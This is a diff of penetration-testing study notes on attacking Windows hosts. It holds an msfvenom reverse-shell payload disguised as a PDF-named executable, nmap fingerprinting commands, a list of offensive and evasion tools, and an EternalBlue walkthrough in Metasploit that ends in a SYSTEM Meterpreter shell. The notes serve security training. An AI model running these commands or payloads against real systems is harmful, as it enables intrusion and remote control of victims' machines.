@@ -249,3 +249,149 @@ __Building A Stageless Payload (Windows)__
  msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
 ```
 here we choose .exe
+
+# Infiltrating Windows
+
+## Prominent Windows Exploits
+![image](https://github.com/user-attachments/assets/b202e405-6dd2-4a75-8d99-4cc96536fe2b)
+With these vulnerabilities in mind, Windows isn't going anywhere. We need to be proficient with identifying vulnerabilities, exploiting them, and moving around in Windows hosts and environments. An understanding of these concepts can help us secure our environments from attack as well. 
+
+## Enumerating Windows & Fingerprinting Methods
+To quickly check if a host is likely a Windows machine, look at the Time To Live (TTL) value in ICMP responses. Windows typically responds with a TTL of 128, though sometimes 32. TTL values may vary if you're not on the same network layer. Most hosts are less than 20 hops away, so TTL rarely drops enough to match other OS types. A TTL of 128 in a ping response is a good indicator of a Windows system.
+
+```
+ping 192.168.86.39
+```
+Another way we can validate if the host is Windows or not is to use our handy tool, NMAP. 
+
+__Os Detection Scan__
+```
+sudo nmap -v -O 192.168.86.39
+```
+example, we will utilize the -O option with verbose output -v to initialize an OS Identification scan against our target $Target. If you run into issues and the scans turn up little results, attempt again with the -A and -Pn options. This will perform a different scan and may work.
+
+To perform banner grabbing, we can use several different tools. Netcat, Nmap, and many others can perform the enumeration we need, but for this instance, we will look at a simple Nmap script called banner.nse. 
+
+__Banner Grab to Enumerate Ports__ 
+```
+sudo nmap -v 192.168.86.39 --script banner.nse
+```
+## Bats, DLLs, & MSI Files, Oh My!
+
+### Payload Types for Windows Hosts
+
+When creating payloads for Windows hosts, common options include DLLs, batch files, MSI packages, and PowerShell scripts. Each file type offers different capabilities, but all are executable on the host. Choose the type based on your delivery method.
+
+- **DLLs**: Dynamic Linking Libraries used by many programs. Malicious DLLs can elevate privileges or bypass User Account Controls (UAC).
+- **Batch Files**: Text-based scripts (.bat) used to automate commands, such as opening ports or sending info back to an attacker.
+- **VBS**: is a lightweight scripting language based on Microsoft's Visual Basic. It is typically used as a client-side scripting language in webservers to enable dynamic web pages. VBS is dated and disabled by most modern web browsers but lives on in the context of Phishing and other attacks aimed at having users perform an action such as enabling the loading of Macros in an excel document or clicking on a cell to have the Windows scripting engine execute a piece of code.
+- **MSI**: Installation files used by Windows Installer. Payloads can be crafted as .msi files, run with `msiexec` to gain access.
+- **PowerShell**: A powerful shell and scripting language. It can execute payloads, gain a shell, and perform various penetration testing tasks.
+
+These file types provide flexibility in crafting and delivering payloads to compromise a Windows system.
+
+## Tools, Tactics, and Procedures for Payload Generation, Transfer, and Execution
+
+### Payload Generation Options for Windows Hosts
+
+Here are some useful tools for generating payloads against Windows systems:
+
+- **MSFVenom & Metasploit Framework**: 
+  - A versatile tool for generating payloads, enumerating hosts, using exploits, and performing post-exploitation. Acts as a swiss-army knife for pentesters.
+  
+- **Payloads All The Things**: 
+  - A resource with cheat sheets and guides for payload generation and overall methodology.
+  
+- **Mythic C2 Framework**: 
+  - An alternative to Metasploit, serving as a Command and Control (C2) framework with unique payload generation tools.
+  
+- **Nishang**: 
+  - A collection of offensive PowerShell scripts and implants useful for pentesters.
+  
+- **Darkarmour**: 
+  - A tool for generating obfuscated binaries to bypass detection on Windows hosts.
+
+### Payload Transfer and Execution Options
+
+Here are tools and methods for delivering and executing payloads on Windows hosts:
+
+- **Impacket**: 
+  - A Python toolset for interacting with network protocols. Key tools include `psexec`, `smbclient`, `wmi`, Kerberos, and the ability to create an SMB server.
+  
+- **Payloads All The Things**: 
+  - A great resource for file transfer oneliners and quick methods to move files between hosts.
+
+- **SMB**: 
+  - Useful for transferring files between domain-joined hosts with shared drives. Attackers can exploit C$ and admin$ shares for payload transfer or data exfiltration.
+
+- **Remote execution via MSF**: 
+  - Metasploit modules can automatically build, stage, and execute payloads on remote hosts.
+
+- **Other Protocols**: 
+  - Protocols like FTP, TFTP, HTTP/S can be used for file transfers. Always enumerate open services and see what's available for use.
+
+## Example Compromise Walkthrough
+
+### 1. **Enumeration of the Host**
+- Use tools like Ping, Netcat, Nmap, or Metasploit for host enumeration.
+- **Nmap Scan Command**: `nmap -v -A 10.129.201.97`
+  - Open Ports: 135 (msrpc), 80 (http), 139 (netbios-ssn), 445 (microsoft-ds).
+  - Host OS: Windows Server 2016 Standard 6.3.
+  - IIS service running on port 80; SMB open on ports 139/445.
+  
+### 2. **Determine Exploit Path**
+- **Potential exploits**: IIS vulnerabilities, SMB exploits, or Remote Code Execution (RCE).
+- **MS17-010 (EternalBlue)**: Windows Server 2016 is vulnerable. Validate using the `auxiliary/scanner/smb/smb_ms17_010` module in Metasploit.
+
+### 3. **Validate Vulnerability (MS17-010)**
+- Open `msfconsole`, use the auxiliary scanner for MS17-010.
+  - Command: `use auxiliary/scanner/smb/smb_ms17_010`
+  - Set RHOSTS to target IP: `set RHOSTS 10.129.201.97`
+  - Run the module: `run`
+  - Result: Host is likely vulnerable to MS17-010.
+
+### 4. **Select Exploit & Payload**
+- Search for EternalBlue exploit: `search eternal`
+  - Choose `exploit/windows/smb/ms17_010_psexec`.
+  - Default payload: `windows/meterpreter/reverse_tcp`.
+- Set necessary options: 
+  - `set RHOSTS 10.129.201.97`
+  - `set LHOST <your IP>`
+  - `set LPORT 4444`
+
+### 5. **Execute Exploit**
+- Run the exploit: `exploit`
+  - Successful: Gained **NT AUTHORITY\SYSTEM** shell with Meterpreter.
+  
+### 6. **Interact with Meterpreter Shell**
+- Use Meterpreter for post-exploitation actions.
+  - Command: `getuid` (to check current user).
+  - Drop into a native system shell using: `shell`
+  - Identify the shell type (CMD vs. PowerShell) by the prompt.
+  
+  - CMD shell: `C:\Windows\system32>`
+  - PowerShell shell: `PS C:\Windows\system32>`
+  
+### 7. **Summary**
+- Successfully exploited Windows Server 2016 using EternalBlue.
+- Gained a SYSTEM level shell and can run further commands to gather information or escalate further.
+
+## CMD-Prompt and PowerShell
+
+### When to Use CMD
+
+- **Older Hosts**: Use CMD if the target host doesn't have PowerShell installed.
+- **Simple Interactions**: Ideal for basic tasks and commands.
+- **Batch Files/Net Commands**: Best when executing batch scripts, `net` commands, or MS-DOS native tools.
+- **Execution Policies**: If PowerShell execution policies might prevent certain scripts or actions, CMD is a safer option.
+
+### When to Use PowerShell
+
+- **Cmdlets/Custom Scripts**: PowerShell is ideal when you need to run cmdlets or custom-built scripts.
+- **.NET Interactions**: Use PowerShell when you want to work with .NET objects instead of simple text output.
+- **Cloud Services**: Best when interacting with cloud-based services or hosts.
+- **Aliases**: Use PowerShell if your scripts rely on Aliases for execution.
+
+## WSL and PowerShell For Linux
+
+Windows Subsystem for Linux (WSL) is a feature in Windows that lets you run a full Linux environment directly on your Windows machine without needing to use a virtual machine (VM) or dual boot. It allows developers and system administrators to use Linux tools and commands side by side with Windows programs. 
